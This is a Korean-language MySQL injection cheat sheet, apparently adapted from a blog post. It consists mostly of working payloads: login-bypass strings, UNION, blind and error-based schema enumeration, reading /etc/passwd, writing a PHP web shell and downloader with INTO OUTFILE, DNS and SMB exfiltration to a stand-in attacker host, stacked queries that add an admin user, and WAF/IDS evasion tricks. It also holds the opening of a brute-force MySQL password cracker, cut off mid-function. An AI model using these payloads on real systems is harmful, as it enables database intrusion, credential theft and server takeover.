# MySQL Injection Cheet Sheet
##### 링크: [KOROMOON][KOROMOONlink]
[KOROMOONlink]: https://koromoon.blogspot.com/2018/10/mysql-injection-cheet-sheet.html "Go KOROMOON"
##### 작성자: 김태현 사원
##### 작성일자: 2024년 4월 17일 
</br>

<br><div align="center"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZrq6taZERA6F-hpmK6QBpGVtJeXpx7NivbYH8tuHT_3bTrLQVN035aGfZo2b2ygebR7N1st6MZXVMBARM5YBGMXMRISbL6YuPWsnF_qLrMkOSr0LKojnA5MONQ8Ee_t-qvBSWM9WD1_Q/s1600/MySQL+Injection.jpg"></div><br><br><br>

## (1) 기본 데이터베이스
![스크린샷 2024-04-17 오전 11 22 49](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/6521376f-e45c-42a4-85d2-6dabf6a76f49)

information_schema 는 데이터에 의한 데이터로써 즉, 메타 데이터(Meta Data)로 데이터 사전임.<br><br>
데이터 사전(Data Dictionary)이란 데이터베이스에 속한 데이터들의 정보를 저장한 것으로 시스템 카탈로그(System Catalog)라고도 함.<br><br>
information_schema 는 MySQL 서버가 운영하는 모든 다른 데이터베이스에 대한 정보를 저장하는 장소임. 그 중에는 데이터베이스 이름, 테이블 이름, 컬럼의 자료형, 접근 권한처럼 SQL Injection 공격에 이용될 정도로 민감한 정보도 포함되어 있음.<br><br><br>

## (2) 테스트 인젝션

False 는 쿼리가 유효하지 않음을 나타냄. (MySQL 에러 / 웹 사이트의 누락된 컨텐츠)<br>
True 는 쿼리가 유효함을 의미함. (내용이 평소대로 표시됨)<br><br>

① 문자열<br><br>

주어진 쿼리 `SELECT * FROM Table WHERE id = '1';`<br>

'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;거짓<br>
''&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br>
"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;거짓<br>
""&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br>
\ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;거짓
<p>\\ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참</p><br><br>

예 :<br>
`SELECT * FROM Articles WHERE id = '1''';`<br>
`SELECT 1 FROM dual WHERE 1 = '1'''''''''''''UNION SELECT '2';`<br><br>

노트 :<br>
쌍을 이루는 한 많은 아포스트로피(', ’)와 인용 부호(‘, ’, “, ”, ', ', ", ")를 사용할 수 있음.<br>
따옴표 일련 뒤에 명령문을 계속 입력하는 것도 가능함.<br>
따옴표는 따옴표를 벗어나게 함.<br><br>

② 숫자형<br><br>

주어진 쿼리 `SELECT * FROM Table WHERE id = 1;`<br>

AND 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br>
AND 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;거짓<br>
AND true&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br>
AND false&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;거짓<br>
1-false&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;취약한 경우 1 을 반환<br>
1-true&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;취약한 경우 0 을 반환<br>
1*56&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;취약한 경우 56 을 반환<br>
1*56&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;취약하지 않으면 1 을 반환<br><br>

예 :<br>
`SELECT * FROM Users WHERE id = 3-2;`<br><br>

노트 :<br>
참은 1 과 같음.<br>
거짓은 0 과 같음.<br><br>

③ 로그인<br><br>

주어진 쿼리 `SELECT * FROM Table WHERE username = '';`<br><br>

`' OR '1<br>
' OR 1 -- -<br>
" OR "" = "<br>
" OR 1 = 1 -- -<br>
'='<br>
'LIKE'<br>
'=0--+`<br><br>

예 :<br>
`SELECT * FROM Users WHERE username = 'Mike' AND password = '' OR '' = '';`<br><br><br>



## (3) 코멘트 아웃 쿼리(Comment Out Query)

여기서 코멘트 아웃(Comment Out)이란 디버그에서 자주 사용되는 방법으로 코멘트를 지시하는 문을 삽입하여 프로그램이나 명령어 집합의 일부를 일시적으로 사용하지 않는 것을 말함.

![스크린샷 2024-04-17 오후 2 05 54](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/930f2e11-de95-4438-b734-4ca289aac282)<br><br>


예 :<br>
`SELECT * FROM Users WHERE username = '' OR 1=1 -- -' AND password = '';<br>
SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3`';`<br><br>

노트 :<br>
별칭으로 사용할 때 Backtick 연산자(`)는 쿼리를 종료할 때만 사용할 수 있음.<br><br><br>



## (4) 버전 테스팅

① 변수<br><br>

`VERSION()<br>
@@VERSION<br>
@@GLOBAL.VERSION`<br><br>

예 :<br>
`SELECT * FROM Users WHERE id = '1' AND MID(VERSION(),1,1) = '5';`<br><br>

노트 :<br>
DBMS 가 윈도우 기반 시스템에서 실행되는 경우 결과값에는 -nt-log 가 포함됨.<br>
@@GLOBAL 는 글로벌 변수를 의미하며 글로벌 변수 지정은 슈퍼 권한이 있어야 함.<br><br>

② 특정 코드<br><br>

`/*!버전 특정 코드*/`<br><br>

예 :<br>
`주어진 쿼리 SELECT * FROM Users limit 1,{INJECTION POINT};`<br><br>

`1 /*!50094eaea*/; 거짓 - 버전이 5.00.94 이상임.<br>
1 /*!50096eaea*/; 참 - 버전이 5.00.96 보다 작음.<br>
1 /*!50095eaea*/; 거짓 - 버전이 5.00.95 와 같음.`<br><br>

노트 :<br>
주입 위치로 인해 더 이상 SQL 쿼리에 추가할 수 없는 상황에서 버전을 판별하는 데 유용할 수 있음.<br>
MySQL 특정 코드에 대한 자세한 내용은 아래 ( 19 ) MySQL 특정 코드 부분을 참조 바람.<br><br><br>



## (5) 데이터베이스 자격 증명
<br>
![스크린샷 2024-04-17 오후 2 11 30](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/e5b243ae-9d8b-4832-a736-686d08842495)<br><br>


예 :<br>
`SELECT current_user;<br>
SELECT CONCAT_WS(0x3A, user, password) FROM mysql.user WHERE user = 'root'-- (Privileged)`<br><br><br>



## (6) 데이터베이스 이름
<br>
![스크린샷 2024-04-17 오후 2 13 29](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/e9f4c5b6-d7d0-44c9-b63b-140980ec3b29)<br><br>

예 :<br>
`SELECT database();<br>
SELECT schema_name FROM information_schema.schemata;<br>
SELECT DISTINCT(db) FROM mysql.db;-- (Privileged)`<br><br><br>



## (7) 서버 호스트 이름

@@HOSTNAME<br><br>

예 :<br>
`SELECT @@hostname;`<br><br><br>



## (8) 서버 MAC 주소

Universally Unique Identifier는 인터페이스 MAC 주소에서 마지막 12 자리 숫자가 형성된 128 비트 숫자임.<br><br>

UUID()<br><br>

예 :<br>
`aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee;`<br><br>

노트 :<br>
일부 운영 체제에서는 MAC 주소 대신 48 비트 임의의 문자열을 반환할 수 있음.<br><br><br>



## (9) 테이블과 컬럼

**① 컬럼 수 결정**<br><br>

ⓐ Order/Group By<br><br>

GROUP/ORDER BY n+1<br><br>

노트 :<br>
거짓 결과값이 출력될 때까지 번호를 계속 증가시킴.<br>
GROUP BY 와 ORDER BY 는 SQL 에서 다른 기능을 가지고 있지만 정확히 같은 방식으로 쿼리 수를 결정할 수 있음.<br><br>
참고로 ORDER BY 절은 조회된 결과의 데이터들을 원하는 필드를 기준으로 정렬하여 보기 좋게 출력하는데 사용되며 GROUP BY 절은 데이터들을 작은 그룹으로 분류하여 그룹에 대한 항목별로 통계적인 정보를 얻고자 사용됨.<br><br>

예 : <br>
`주어진 쿼리 SELECT username, password, permission FROM Users WHERE id = '{INJECTION POINT}';`<br><br>

`1' ORDER BY 1--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br>
1' ORDER BY 2--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br>
1' ORDER BY 3--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br>
1' ORDER BY 4--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;거짓 - 쿼리는 3 개의 컬럼만 사용함.<br>
-1' UNION SELECT 1,2,3--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br><br>`

ⓑ 에러 기반(Error Based)1<br><br>

GROUP/ORDER BY 1,2,3,4,5...<br><br>

노트 :<br>
이전 방법과 마찬가지로 에러 표시가 활성화된 경우 한번의 쿼리 요청으로 컬럼 수를 확인할 수 있음.<br><br>

예 :<br>
`주어진 쿼리 SELECT username, password, permission FROM Users WHERE id = '{INJECTION POINT}'`<br><br>

`1' GROUP BY 1,2,3,4,5--+  그룹 문에서 알 수 없는 열 '4'<br>
1' ORDER BY 1,2,3,4,5--+  Order 절에서 알수 없는 열 '4'`<br><br>

ⓒ 에러 기반2<br><br>

SELECT ... INTO var_list, var_list1, var_list2...<br><br>

노트 :<br>
이 방법은 에러 표시가 활성화된 경우 작동함.<br>
주입 지점이 LIMIT 절 다음에 있을 때 컬럼 수를  찾는 데 유용함.<br>

예1 :<br>
`주어진 쿼리 SELECT permission FROM Users WHERE id = {INJECTION POINT};`<br><br>

`-1 UNION SELECT 1 INTO @,@,@&nbsp;&nbsp;사용된 SELECT 문은 다른 컬럼 수를 가짐.<br>
-1 UNION SELECT 1 INTO @,@&nbsp;&nbsp;&nbsp;&nbsp;사용된 SELECT 문은 다른 컬럼 수를 가짐.<br>
-1 UNION SELECT 1 INTO @&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;에러가 없다는 건 컬럼 1개를 사용함을 의미함.`<br><br>

예2 :<br>
`주어진 쿼리 SELECT username, permission FROM Users limit 1,{INJECTION POINT};`<br><br>

`1 INTO @,@,@&nbsp;&nbsp;&nbsp;&nbsp;사용된 SELECT 문은 다른 컬럼 수를 가짐.<br>
1 INTO @,@&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;에러가 없다는 건 컬럼 2개를 사용함을 의미함.<br><br>`

ⓓ 에러 기반3<br><br>

`AND (SELECT * FROM SOME_EXISTING_TABLE) = 1`<br><br>

노트 :<br>
이 작업은 이후의 테이블 명을 알고 에러 표시가 활성화된 경우 작동함.<br>
쿼리가 아닌 테이블의 컬럼 수를 반환함.<br><br>

예 :<br>
`주어진 쿼리 SELECT permission FROM Users WHERE id = {INJECTION POINT};`<br><br>

`1 AND (SELECT * FROM Users) = 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;피연산자는 3개의 컬럼을 포함해야 함.`<br><br>

**② 테이블 검색**<br><br>

ⓐ Union<br><br>

`UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;`<br><br>

노트 :<br>
MySQL 5 의 경우 version = 10 임.<br>
Union SQL Injection 이란 2개 이상의 쿼리를 요청하여 결과를 얻는 UNION 이라는 SQL 연산자를 이용한 SQL Injecion 공격을 말하며 공격자는 이 연산자를 이용하여 원래의 요청에 한 개의 추가 쿼리를 삽입하여 정보를 얻어냄.<br>
(전제 조건 : 컬럼의 갯수가 같아야 하고 데이터 형식도 같아야 함)<br><br>

ⓑ Blind<br>

`AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'`<br><br>

노트 :<br>
MySQL 5 의 경우 version = 10 임.<br>
Blind SQL Injection 이란 에러문과 같은 시작적 근거가 없을 때 사용하는 기법으로 참/거짓에 따른 차이를 이용한 SQL Injection 공격임.<br>
해당 기법에 주로 SUBSTR() 함수가 주로 쓰이며 해당 함수는 문자열과 자를 문자열의 범위를 파라미터로 받아서 해당 부분의 문자열을 리턴해주는 함수임.<br>
SUBSTR() 함수의 기본 형식은 아래와 같음.<br>
substr("문자열", 자르기 시작할 문자의 인덱스, 자를 문자의 개수)<br><br>

ⓒ Error<br><br>

`AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2)))<br><br>

(@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0);<br><br>

AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));-- Available in 5.1.5`<br><br>

노트 :<br>
MySQL 5 의 경우 version = 10 임.<br>

**③ 컬럼 검색**<br><br>

ⓐ Union<br><br>

`UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'`<br><br>

ⓑ Blind<br><br>

`AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'`<br><br>

ⓒ Error<br><br>

`AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2)))<br><br>

(@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0);<br><br>

AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));-- Available in MySQL 5.1.5<br><br>

AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)-- Fixed in MySQL 5.1<br><br>

AND (SELECT * FROM (SELECT * FROM SOME_EXISTING_TABLE JOIN SOME_EXISTING_TABLE b) a)<br><br>

AND (SELECT * FROM (SELECT * FROM SOME_EXISTING_TABLE JOIN SOME_EXISTING_TABLE b USING (SOME_EXISTING_COLUMN)) a)`<br><br>

ⓓ PROCEDURE ANALYSE()<br><br>

`PROCEDURE ANALYSE()`<br><br>

노트 :<br>
웹 응용 프로그램에서 주입하려는 SQL 쿼리에 선택한 컬럼 중 하나를 표시해야 함.<br>
PROCEDURE ANALYSE() 함수는 MySQL 3.23.x 이상 버전에서 사용 가능한 기능으로 테이블 각 열에 대한 최적의 데이터 형식을 제공하거나 현재 쿼리에서 사용되고 있는 Column 에 관한 정보를 뿌려주는 역할을 함.<br><br>

예 :<br>
`주어진 쿼리 SELECT username, permission FROM Users WHERE id = 1;`<br><br>

`1 PROCEDURE ANALYSE()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;첫 번째 컬럼의 이름 가져오기<br>
1 LIMIT 1,1 PROCEDURE ANALYSE()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;두 번째 컬럼의 이름 가져오기<br>
1 LIMIT 2,1 PROCEDURE ANALYSE()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;세 번째 컬럼의 이름 가져오기`<br><br>

④ 한 번에 여러 테이블/컬럼 검색<br><br>

`SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema>=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] >',table_name,' > ',column_name))))x`<br><br>

예 :<br>
`SELECT * FROM Users WHERE id = '-1' UNION SELECT 1, 2, (SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema>=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] >',table_name,' > ',column_name))))x), 4--+';`<br><br>

결과값 :<br>
`[ information_schema ] >CHARACTER_SETS > CHARACTER_SET_NAME<br>
[ information_schema ] >CHARACTER_SETS > DEFAULT_COLLATE_NAME<br>
[ information_schema ] >CHARACTER_SETS > DESCRIPTION<br>
[ information_schema ] >CHARACTER_SETS > MAXLEN<br>
[ information_schema ] >COLLATIONS > COLLATION_NAME<br>
[ information_schema ] >COLLATIONS > CHARACTER_SET_NAME<br>
[ information_schema ] >COLLATIONS > ID<br>
[ information_schema ] >COLLATIONS > IS_DEFAULT<br>
[ information_schema ] >COLLATIONS > IS_COMPILED`<br><br>

`SELECT MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns`<br><br>

예 :<br>
`SELECT username FROM Users WHERE id = '-1' UNION SELECT MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns--+';`<br><br>

결과값 :<br>
Table: talk_revisions<br>
Column: revid<br><br>

Table: talk_revisions<br>
Column: userid<br><br>

Table: talk_revisions<br>
Column: user<br><br>

Table: talk_projects<br>
Column: priority<br><br>

**⑤ 컬럼 이름에서 테이블 찾기**<br><br>

![스크린샷 2024-04-17 오후 2 24 41](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/cfdc2a25-5b17-4e98-9cea-c29da3367748)<br><br>


**⑥ 테이블 이름에서 컬럼 찾기**<br><br>

![스크린샷 2024-04-17 오후 2 25 03](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/acd92c65-df85-491c-a56d-3d222a2c66eb)


**⑦ 현재 쿼리 찾기**<br><br>

![스크린샷 2024-04-17 오후 2 25 23](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/9cc0aace-59fe-44e7-93b3-e4c723f8ec1d)<br><br><br>



## (10) 인용 기호 피하기

![스크린샷 2024-04-17 오후 2 25 49](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/2c85ad87-68b3-4210-a6bd-68fb7fc9592f)<br><br><br>




## (11) 문자열 연결

![스크린샷 2024-04-17 오후 2 26 12](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/62376f97-03bb-4880-b704-bf6303bd11cd)<br><br>


노트 :<br>
CONCAT() 은 인수 중 하나라도 NULL 이면 NULL 을 반환함. 대신 CONCAT_WS()를 사용하십시오.<br>
CONCAT_WS()의 첫 번째 인수는 나머지 인수에 대한 구분 기호를 정의함.<br><br><br>



## (12) 조건문

![스크린샷 2024-04-17 오후 2 26 37](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/47812b85-e77c-4619-89a4-205f2563b685)<br><br>

예 :<br>
`SELECT IF(1=1, true, false);<br>
SELECT CASE WHEN 1=1 THEN true ELSE false END;`<br><br><br>



## (13) 타이밍

![스크린샷 2024-04-17 오후 2 27 11](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/81e1a2d6-c1de-40de-abbb-a9c45b63ea51)<br><br>


예 :<br>
`' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '`<br><br><br>



## (14) 특권

**① 파일 특권**<br><br>

다음 쿼리는 주어진 사용자에 대한 FILE 특권을 판별하는데 도움을 줄 수 있음.<br><br>

![스크린샷 2024-04-17 오후 2 27 52](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/47f99eb8-2913-4b6d-84c0-459725f62591)<br><br><br>



## (15) 파일 읽기

사용자에게 FILE 특권이 있으면 파일을 읽을 수 있음.<br><br>

`LOAD_FILE()`<br><br>

예 :<br>
`SELECT LOAD_FILE('/etc/passwd');<br>
SELECT LOAD_FILE(0x2F6574632F706173737764);`<br><br>

노트 :<br>
파일은 서버 호스트에 있어야 함.<br>
LOAD_FILE() 에 대한 basedirectory 는 @@datadir 임.<br>
이 파일은 MySQL 사용자가 읽을 수 있어야 함.<br>
파일 크기는 max_allowed_packet 보다 작아야 함.<br>
@@max_allowed_packet 의 기본 크기는 1047552 바이트임.<br><br><br>



## (16) 파일 쓰기

사용자에게 FILE 특권이 있으면 파일을 작성할 수 있음.<br><br>

`INTO OUTFILE/DUMPFILE`<br><br>

예 :<br>
`PHP 쉘을 작성하려면 :<br>
SELECT '<? system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';<br>
다음 위치에서 액세스하십시오 :<br>
hxxp://localhost/shell.php?c=cat%20/etc/passwd`<br><br>

`다운로더를 작성하려면 :<br>
SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'<br><br>
다음 위치에서 액세스하십시오 :<br>
hxxp://localhost/get.php?f=shell.php&u=http://localhost/c99.txt`<br><br>

노트 :<br>
파일은 INTO OUTFILE 로 겹쳐 쓸 수 없음.<br>
INTO OUTFILE 은 쿼리의 마지막 명령문이어야 함.<br>
경로 이름을 인코딩할 방법이 없으므로 따옴표가 필요함.<br><br><br>



## (17) 대역 외 채널링

**① DNS Requests**<br><br>

1SELECT LOAD_FILE(CONCAT('\\\\foo.',(select MID(version(),1,1)),'.attacker.com\\'));1<br><br>

**② SMB Requests**<br><br>

`' OR 1=1 INTO OUTFILE '\\\\attacker\\SMBshare\\output.txt`<br><br><br>



### (18) 누적된 쿼리(Stacked Queries)

누적된 쿼리 기법은 하나의 쿼리에 추가적인 쿼리를 삽입하는 기법임.<br>
PHP 응용 프로그램이 데이터베이스와 통신하는 데 사용되는 드라이버에 따라 MySQL 에서 가능함.<br>
PDO_MYSQL 드라이버는 누적된 쿼리(Stacked Queries)를 지원함.<br>
MySQLi (Improved Extension) 드라이버는 multi_query() 함수를 통해 누적된 쿼리(Stacked Queries)를 지원함.<br><br>

예 :<br>
`SELECT * FROM Users WHERE ID=1 AND 1=0; INSERT INTO Users(username, password, priv) VALUES ('BobbyTables', 'kl20da$$','admin');<br>
SELECT * FROM Users WHERE ID=1 AND 1=0; SHOW COLUMNS FROM Users;`<br><br><br>



### (19) MySQL 특정 코드

MySQL 에서는 느낌표 뒤에 버전 번호를 지정할 수 있음.<br>
주석의 구문은 버전이 지정된 버전 번호보다 크거나 같으면 실행됨.<br><br>

예 :<br>
`UNION SELECT /*!50000 5,null;*//*!40000 4,null-- ,*//*!30000 3,null-- x*/0,null--+<br>
SELECT 1/*!41320UNION/*!/*!/*!00000SELECT/*!/*!USER/*!(/*!/*!/*!*/);`<br><br>

노트 :<br>
첫 번째 예제는 버전을 반환함. 2개의 컬럼이 있는 UNION 을 사용함.<br>
두 번째 예제는 WAF/IDS 를 우회하는데 어떻게 사용되는 지를 보여줌.<br><br><br>



## (20) 퍼징(Fuzzing)과 난독화(Obfuscation)

**① 허용된 중간 문자열**<br><br>

다음 문자는 공백으로 사용할 수 있음.<br><br>

![스크린샷 2024-04-17 오후 2 31 34](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/6e460be1-4209-415c-b762-5e5ca24c0d0f)<br><br>


예 :<br>
`'%0A%09UNION%0CSELECT%A0NULL%20%23`<br><br>

공백을 사용하지 않으려면 괄호를 사용할 수도 있음.<br><br>

![스크린샷 2024-04-17 오후 2 31 55](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/b1d2f79e-7522-4237-b6d3-54a87f7a67dc)<br><br>


예 :<br>
`UNION(SELECT(column)FROM(table))`<br><br>

**② AND/OR 뒤에 허용되는 중간 문자열**<br><br>

![스크린샷 2024-04-17 오후 2 32 24](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/abb3eb20-9560-4e48-ad81-4dc17033e743)<br><br>


예 :<br>
`SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~((1))`<br><br>

노트 :<br>
DUAL 테이블은 테스트에 사용할 수 있는 더미 테이블임.<br><br>

**③ 주석으로 난독화**<br><br>

WAF/IDS 를 우회하기 위해 주석을 사용하여 쿼리를 분할할 수 있음.<br>
<p># 또는 -- 와 같은 개행 문자를 사용하여 쿼리를 별도의 줄로 나눌 수 있음.</p><br><br>

예 :<br>
`1'#<br>
AND 0--<br>
UNION# I am a comment!<br>
SELECT@tmp:=table_name x FROM--<br>
`information_schema`.tables LIMIT 1#`<br><br>

URL 인코딩은 다은과 같이 나타냄 :<br>
`1'%23%0AAND 0--%0AUNION%23 I am a comment!%0ASELECT@tmp:=table_name x FROM--%0A`information_schema`.tables LIMIT 1%23`<br><br>

특정 함수는 주석과 공백으로 난독화할 수 있음.<br>
`VERSION/**/%A0 (/*comment*/)`<br><br>

**④ 인코딩**<br><br>

주입을 인코딩하면 WAF/IDS 우회에 유용할 때도 있음.<br><br>

![스크린샷 2024-04-17 오후 2 33 56](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/70bae8cc-b287-4b5f-bd03-a840fdc562b5)<br><br>


**⑤ 키워드 피하기**<br><br>

IDS/WAF 가 특정 키워드를 차단하는 경우 인코딩을 사용하지 않고 다른 키워드를 사용하는 방법이 있음.<br><br>

`information_schema.tables`<br><br>

![스크린샷 2024-04-17 오후 2 57 54](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/1101bf45-faee-48ba-a978-9439699e2304)<br><br>


노트 :<br>
대체 이름은 테이블에 있는 PRIMARY 키에 따라 다를 수 있음.<br><br><br>



## (21) 연산자

![스크린샷 2024-04-17 오후 2 58 37](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/dd796b56-e57d-41af-8846-9601392be528)<br><br><br>

## (22) 상수

![스크린샷 2024-04-17 오후 2 58 59](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/e151303f-3b57-4edd-9045-17b423ba14c9)<br><br><br>




## (23) 패스워드 해싱(Password Hashing)

MySQL 4.1 이전 버전에서는 PASSWORD() 함수로 계산된 암호 해시는 16 바이트임.
이러한 해시는 다음과 같음.<br><br>

![스크린샷 2024-04-17 오후 2 59 22](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/07032ab1-0ae1-4fd4-a718-67b9a8269bec)<br><br>


MySQL 4.1 부터 PASSWORD() 함수는 더 긴 41 바이트 해시값으로 생성하도록 수정됨.<br><br>
![스크린샷 2024-04-17 오후 2 59 37](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/6a3d5fc2-a145-478d-9bdb-10cfbd1e17fe)



## (24) 패스워드 크랙(Password Cracking)

Cain&Abel 과 John the Ripper 는 모두 MySQL 3.x-6.x 암호를 해독할 수 있음.<br>
JTR 용 Metasploit 모듈은 아래 링크에서 찾을 수 있음.<br>
http://www.metasploit.com/modules/auxiliary/analyze/jtr_mysql_fast<br><br>

**① MySQL < 4.1 Password Cracker**<br><br>

아래 코드는 MySQL 해시 암호용 고속 Brute-force 암호 크래커임.<br>
일반 PC 에서 인쇄 가능한 ASCII 문자가 포함된 8자리 암호를 몇 시간만에 해독할 수 있음.<br><br>

```/* This program is public domain. Share and enjoy.
*
* Example:
* $ gcc -O2 -fomit-frame-pointer MySQLfast.c -o MySQLfast
* $ MySQLfast 6294b50f67eda209
* Hash: 6294b50f67eda209
* Trying length 3
* Trying length 4
* Found pass: barf
*
* The MySQL password hash function could be strengthened considerably
* by:
* - making two passes over the password
* - using a bitwise rotate instead of a left shift
* - causing more arithmetic overflows
*/

#include <stdio.h>

typedef unsigned long u32;

/* Allowable characters in password; 33-126 is printable ascii */
#define MIN_CHAR 33
#define MAX_CHAR 126

/* Maximum length of password */
#define MAX_LEN 12

#define MASK 0x7fffffffL

int crack0(int stop, u32 targ1, u32 targ2, int *pass_ary)
{
  int i, c;
  u32 d, e, sum, step, diff, div, xor1, xor2, state1, state2;
  u32 newstate1, newstate2, newstate3;
